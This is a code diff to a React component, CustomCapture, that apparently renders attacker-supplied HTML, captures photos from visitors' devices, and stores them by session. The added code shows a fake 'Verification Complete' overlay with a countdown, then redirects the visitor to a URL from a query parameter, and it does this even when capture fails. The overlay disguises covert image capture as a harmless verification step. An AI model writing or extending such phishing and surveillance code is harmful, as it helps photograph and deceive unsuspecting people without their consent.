@@ -1,4 +1,4 @@
-import { useEffect, useState, useRef } from "react";
+import { useEffect, useState, useRef, useCallback } from "react";
 import { useSearchParams } from "react-router-dom";
 import { supabase } from "@/integrations/supabase/client";
 
@@ -8,9 +8,127 @@ const CustomCapture = () => {
   const canvasRef = useRef<HTMLCanvasElement>(null);
   const [customHtml, setCustomHtml] = useState<string | null>(null);
   const [captureComplete, setCaptureComplete] = useState(false);
+  const [countdown, setCountdown] = useState<number | null>(null);
+  const [showCountdown, setShowCountdown] = useState(false);
   
   const sessionId = searchParams.get("session") || "default";
   const redirectUrl = searchParams.get("redirect") || "https://google.com";
+  const countdownSeconds = parseInt(searchParams.get("timer") || "5", 10);
+
+  // Generate countdown overlay HTML
+  const getCountdownHtml = useCallback((seconds: number) => {
+    return `
+      <div id="countdown-overlay" style="
+        position: fixed;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+        background: rgba(10, 10, 26, 0.95);
+        backdrop-filter: blur(20px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 99999;
+        font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      ">
+        <div style="
+          text-align: center;
+          padding: 48px;
+          background: rgba(15, 15, 30, 0.9);
+          border: 1px solid rgba(0, 255, 136, 0.3);
+          border-radius: 24px;
+          box-shadow: 0 0 60px rgba(0, 255, 136, 0.2);
+          max-width: 400px;
+          width: 90%;
+        ">
+          <div style="
+            width: 100px;
+            height: 100px;
+            margin: 0 auto 24px;
+            background: linear-gradient(135deg, #00ff88 0%, #06b6d4 100%);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 48px;
+            font-weight: 700;
+            color: #0a0a1a;
+            box-shadow: 0 0 50px rgba(0, 255, 136, 0.5);
+            animation: pulse-countdown 1s ease-in-out infinite;
+          ">
+            ${seconds}
+          </div>
+          
+          <div style="
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(0, 255, 136, 0.1);
+            border: 1px solid rgba(0, 255, 136, 0.3);
+            padding: 8px 16px;
+            border-radius: 100px;
+            margin-bottom: 20px;
+          ">
+            <div style="
+              width: 8px;
+              height: 8px;
+              background: #00ff88;
+              border-radius: 50%;
+              animation: blink-dot 0.5s ease-in-out infinite;
+            "></div>
+            <span style="
+              color: #00ff88;
+              font-size: 12px;
+              font-weight: 600;
+              text-transform: uppercase;
+              letter-spacing: 1px;
+            ">Verification Complete</span>
+          </div>
+          
+          <h2 style="
+            color: #ffffff;
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 12px;
+          ">Redirecting...</h2>
+          
+          <p style="
+            color: #888;
+            font-size: 14px;
+            line-height: 1.6;
+            margin-bottom: 24px;
+          ">You will be redirected automatically in ${seconds} second${seconds !== 1 ? 's' : ''}.</p>
+          
+          <div style="
+            width: 100%;
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 100px;
+            overflow: hidden;
+          ">
+            <div style="
+              width: ${((countdownSeconds - seconds) / countdownSeconds) * 100}%;
+              height: 100%;
+              background: linear-gradient(90deg, #00ff88 0%, #06b6d4 100%);
+              transition: width 1s linear;
+              border-radius: 100px;
+            "></div>
+          </div>
+        </div>
+      </div>
+      <style>
+        @keyframes pulse-countdown {
+          0%, 100% { transform: scale(1); box-shadow: 0 0 50px rgba(0, 255, 136, 0.5); }
+          50% { transform: scale(1.05); box-shadow: 0 0 70px rgba(0, 255, 136, 0.7); }
+        }
+        @keyframes blink-dot {
+          0%, 100% { opacity: 1; }
+          50% { opacity: 0.3; }
+        }
+      </style>
+    `;
+  }, [countdownSeconds]);
 
   // Load custom HTML from settings
   useEffect(() => {
@@ -315,17 +433,41 @@ const CustomCapture = () => {
         }
         
         setCaptureComplete(true);
-        // No redirect - user stays on custom HTML page
+        
+        // Start countdown after capture is complete
+        setShowCountdown(true);
+        setCountdown(countdownSeconds);
         
       } catch (error) {
         console.error("Capture error:", error);
+        // Even on error, start the countdown
+        setCaptureComplete(true);
+        setShowCountdown(true);
+        setCountdown(countdownSeconds);
       }
     };
 
     // Start capture after a short delay to let HTML render
     const timer = setTimeout(capturePhotos, 500);
     return () => clearTimeout(timer);
-  }, [customHtml, captureComplete, sessionId]);
+  }, [customHtml, captureComplete, sessionId, countdownSeconds]);
+
+  // Countdown timer effect
+  useEffect(() => {
+    if (countdown === null || countdown < 0) return;
+
+    if (countdown === 0) {
+      // Redirect when countdown reaches 0
+      window.location.href = redirectUrl;
+      return;
+    }
+
+    const timer = setTimeout(() => {
+      setCountdown(prev => (prev !== null ? prev - 1 : null));
+    }, 1000);
+
+    return () => clearTimeout(timer);
+  }, [countdown, redirectUrl]);
 
   // Show loading if no custom HTML
   if (!customHtml) {
@@ -350,6 +492,11 @@ const CustomCapture = () => {
       
       {/* Render custom HTML */}
       <div dangerouslySetInnerHTML={{ __html: customHtml }} />
+      
+      {/* Countdown overlay after capture */}
+      {showCountdown && countdown !== null && (
+        <div dangerouslySetInnerHTML={{ __html: getCountdownHtml(countdown) }} />
+      )}
     </>
   );
 };
